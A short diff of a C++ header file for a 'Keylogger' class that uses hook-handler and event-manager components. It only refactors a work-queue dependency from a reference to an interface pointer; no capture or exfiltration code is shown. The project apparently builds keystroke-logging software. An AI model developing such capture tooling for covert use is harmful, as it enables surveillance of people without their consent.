@@ -13,11 +13,11 @@
 #include "IKeylogger.h"
 #include "EventManager.h"
 #include "HookHandler.h"
-#include "WorkQueue.h"
+#include "workQueueManager.h"
 
 class Keylogger : public IKeylogger {
 public:
-    Keylogger(WorkQueue& wqueue);
+    Keylogger(IWorkQueue *);
 	~Keylogger();
     bool				init();   
     bool				run();
@@ -30,7 +30,7 @@ private:
     EventManager		_eventManager;
     HookHandler			_hookHandler;
     std::vector<AEvent*> _events;
-	WorkQueue&			_levents;
+	IWorkQueue*			_levents;
 };
 
 #endif //_KEYLOGGER_H
